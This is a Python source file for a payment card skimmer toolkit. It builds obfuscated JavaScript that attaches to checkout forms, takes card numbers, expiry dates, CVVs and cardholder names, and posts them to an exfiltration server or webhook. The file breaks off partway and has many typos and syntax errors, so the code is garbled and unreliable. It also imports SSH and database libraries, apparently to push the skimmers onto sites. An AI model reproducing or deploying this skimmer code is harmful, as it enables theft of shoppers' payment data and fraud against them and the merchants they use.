#!/usr/bin/env python3
"""
Skimmer deploymemt and data collection system
"""

import os
import re
import json
import time
import base64
import hashlib
import sqlite3
import requests
import paramiko
import mysql.connector
from datetime import datetime
from cryptography.fernet import fernet
from flask import Flask, request, jsonify

#============PART 1: SKIMMER SCRIPT GENERATOR ========================

class SkimmerGenerator:
    """Generates obfuscated Javascript skimmer code"""

    def __init__(self, webhook_url, exfil_server):
        self.webhook = webhook_url
        self.exfil_server = exfil_server
        self.encryption_key = Ferent.generate_key()
        self.cipher = Fernet(self.encryption_key)

    def generate_skimmer(self, template_type = "full"):
        """Generate different skimmer variants"""

        variants = {
        "minimal": self.minimal_skimmer(),
        "standard": self._standard_skimmer(),
        "advanced":self._advanced_skimmer(),
        "stealth": self._stealth_skimmer()
        }

        script = variamts.get(template_type, self._standard_skimmer())
        obfuscated = self._obfuscate(script)
        return obfuscated

    def _minimal_skimmer(self):
        return f"""
        (function(){{
            let d=[];
            document.querySelectorAll('form').forEach(f=>{{
                f.addEventListener('submit', ()=>{{
                    let n=f.querySelector('[name*=number]')?.value;
                    let e=f.querySelector('[name*=exp]')?.value;
                    let c=f.querySelector('[name*cvv]')?.value;
                    if(n) fetch('{self.exfil_server}/c'{{method: 'POST',body:JSON.stringify({{n,e,c}}),mode:'no-cors'}});
                }});
            }});
        }})();
        """
    
    def _standard_skimmer(self):
        return f"""
        (function)() {{
            const webhook = "{self.webhook}";
            let stolen = [];

            function capture() {{
                const inputs = {{
                    card: document.querySelector('input[name*="number"], input[name*="card"]'),
                    expiry: document.querySelector('input[name*="exp"], input[name*="expiry"]'),
                    cvv: document.querySelector('input[name*="cvv"], input[name*="cvc"]'),
                    name: document.querySelector('input[name*="name], input[name*="holder"]')
                }};

                if(inputs.card && inputs.card.value.length > 12) {{
                    const data = {{
                        card: inputs.card.value,
                        expiry: inputs.expiry?.value || '',
                        cvv: inputs.cvv?.value || '',
                        name: inputs.name?.value || '',
                        url: window.location.href,
                        ua: navigator.userAgent,
                        time: new Date().toISOString()
                    }};
                    stolen.push(data);

                    fetch(webhook, {{
                        method: 'POST'
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify(data),
                        mode: 'no-cors'
                    }});

                    inputs.card.value = '';
                }}
            }}
            setInterval(capture, 2000);
            document.querySelectorAll('form').forEach(f => f.addEventListener('submit', capture));
        }});
        """

    def _advanced_skimmer(self):
        
